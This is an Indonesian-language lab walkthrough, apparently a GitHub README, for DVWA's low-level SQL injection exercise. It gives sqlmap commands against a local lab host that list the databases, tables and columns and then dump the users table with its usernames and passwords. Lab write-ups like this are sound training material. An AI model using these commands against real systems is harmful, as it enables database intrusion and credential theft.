<b> HOW TO SOLVE SQL INJECTION LOW </b>

1. First, kita masukin user ID dengan angka '1' untuk men test, setelah itu kita copy url nya

   ```
   http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit# 
   ```

![Screenshot (445)](https://user-images.githubusercontent.com/118157585/215420792-fea06c63-43ad-459a-bca5-b848f089d75d.png)

2. Lalu kita buka Sqlmap di cli kita, copy url tadi. berikut perintahnya :

   ```
   sqlmap -u 'http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#' --dbs
   ```

![Screenshot (446)](https://user-images.githubusercontent.com/118157585/215426505-51d80e8d-087c-4bfa-830d-b39d10f0f624.png)

![Screenshot (447)](https://user-images.githubusercontent.com/118157585/215426535-dfa75a1f-ed59-4a17-a7d8-dd45c03ee464.png)
   nah setelah itu keluar databases nya yang mana bisa kita cek dulu untuk mencari username dan password, seperti gambar diatas terdapat 2 databases yaitu 
  
   <i><b> dvwa </b></i>

   <i><b> information_scheme </b></i>
  
3. Nah disini kita eksekusi dulu di databases <i><b> dvwa </i></b>, dan terdapat 2 tables. dengan perintah :

   ```
   sqlmap -u 'http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#' -D dvwa --tables
   ```
   
   ![Screenshot (450)](https://user-images.githubusercontent.com/118157585/215431105-74110598-67e4-4577-a00a-b217a73e7582.png)
   
4. Sekarang kita coba cek kolom dari tables <i><b> users </i></b>, nah gambar dibawah ini terdapat sebuah username dan password. dengan mengetikkan perintah :

   ```
   sqlmap -u 'http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#' -D dvwa -T users --column
   ```
   
   ![Screenshot (448)](https://user-images.githubusercontent.com/118157585/215431189-1b512563-5a1e-4b92-857b-7cb8309f6f15.png)
   
5. Setelah kita mengetahui di tables <i><b> users </i></b> terdapat kolom usernam dan password, sekarang kita langsung 
   ``
   dump
   ``
   saja tables tersebut dengan mengetikkan perintah :
   
   ```
   sqlmap -u 'http://192.168.18.115/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#' -D dvwa -T users --dump
   ```
   
   ![Screenshot (449)](https://user-images.githubusercontent.com/118157585/215431205-8277a2b9-e772-4e96-a4ff-2fdfa6c0022e.png)
   
   nah itulah hasil yang kita dapet dengan melakukan sql injection
